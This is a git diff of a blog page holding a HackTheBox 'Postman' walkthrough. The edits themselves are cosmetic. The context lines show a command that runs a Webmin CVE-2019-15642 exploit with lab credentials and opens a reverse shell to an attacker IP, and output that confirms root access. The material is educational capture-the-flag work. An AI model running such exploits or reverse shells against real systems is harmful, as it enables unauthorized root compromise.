@@ -52,7 +52,7 @@
     
 
     <link rel="canonical" href="http://localhost:1313/writeups/htb-postman/">
-    <link href="/style.min.70057854b479eccebd00ce1d33560341c1c0af8cca6befd58da0b5471046514b.css" rel="stylesheet">
+    <link href="/style.min.2dc4fd9484cccdeb4e540eaff87cc3f2c37bacb70d134bbaec04ff76525358fc.css" rel="stylesheet">
     <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
 
     
@@ -214,7 +214,7 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span><span class="line"><span class="cl">10000/tcp open  http    MiniServ 1.910 <span class="o">(</span>Webmin httpd<span class="o">)</span>
 </span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: MiniServ/1.910
 </span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
-</span></span></code></pre></div><p>Three ports. Webmin <code>1.910</code> is an old version. The first thing I looked up was CVE-2019-15642 - that&rsquo;s an authenticated RCE that returns a shell as root. But it needs credentials, so it&rsquo;s a privesc primitive waiting to be used, not an entry point.</p>
+</span></span></code></pre></div><p>Three ports. Webmin <code>1.910</code> is an old version. The first thing I looked up was CVE-2019-15642, an authenticated RCE that returns a shell as root. But it needs credentials, so it&rsquo;s a privesc primitive waiting to be used, not an entry point.</p>
 <p><em>Reference: <a href="https://github.com/jas502n/CVE-2019-15642">github.com/jas502n/CVE-2019-15642</a></em></p>
 <p>Port 80 is a static personal page with nothing actionable. Subdomain fuzzing found nothing. The initial scan only shows three ports, so I ran a full port scan while I enumerated what was already visible:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/labs/postman ✗ sudo nmap -sV -sC -T4 -p- <span class="nv">$DC</span>
@@ -321,7 +321,7 @@ stroke-linejoin="round" class="feather feather-home">
 <p><img src="/images/writeups/htb-postman/web-webmin-login.png" alt="Webmin 1.910 login page at port 10000"></p>
 <p><code>Matt:computer2008</code> worked:</p>
 <p><img src="/images/writeups/htb-postman/web-webmin-matt-dashboard.png" alt="Webmin dashboard logged in as Matt showing Software Package Updates panel with 181 packages"></p>
-<p>Logged in as Matt on Webmin 1.910. CVE-2019-15642 is an authenticated RCE in this version. The vulnerability is in a Perl eval in the package update functionality that doesn&rsquo;t sanitize its input, allowing arbitrary code execution under the account running Webmin - which is root. The original PoC was Python 2, so I ported it to Python 3 and adjusted it to trigger a reverse shell directly:</p>
+<p>Logged in as Matt on Webmin 1.910. CVE-2019-15642 is an authenticated RCE in this version. The vulnerability is in a Perl eval in the package update functionality that doesn&rsquo;t sanitize its input, allowing arbitrary code execution under the account running Webmin, which is root. The original PoC was Python 2, so I ported it to Python 3 and adjusted it to trigger a reverse shell directly:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">…/labs/postman ✗ python3 webmin_exploit_py3.py --rhost postman.htb --lhost 10.10.16.129 --lport <span class="m">9999</span> -u Matt -p computer2008
 </span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Webmin 1.910 RCE - CVE-2019-15642
 </span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Target: https://postman.htb:10000/
@@ -338,7 +338,7 @@ stroke-linejoin="round" class="feather feather-home">
 </span></span><span class="line"><span class="cl">Connection received on 10.129.18.102 <span class="m">39388</span>
 </span></span><span class="line"><span class="cl">id
 </span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
-</span></span></code></pre></div><p>Root. No intermediate step from Matt to root - Webmin runs as root, the RCE runs as root, that&rsquo;s it. Root flag.</p>
+</span></span></code></pre></div><p>Root. No intermediate step from Matt to root. Webmin runs as root, the RCE runs as root, that&rsquo;s it. Root flag.</p>
 <p>The credential reuse between the SSH key passphrase and the Webmin login is the connection that makes this box work. It&rsquo;s easy to give up on Webmin after the initial nmap scan when you don&rsquo;t have creds yet. The Redis foothold and the backup key are the nudge to come back and try it. Password reuse on admin panels is extremely common in real environments, which is part of why this pattern shows up so often on HTB.</p>
 
             </div>
@@ -464,6 +464,11 @@ stroke-linejoin="round" class="feather feather-home">
 </svg>
 
 </a>
+
+
+    
+
+
 
 
     
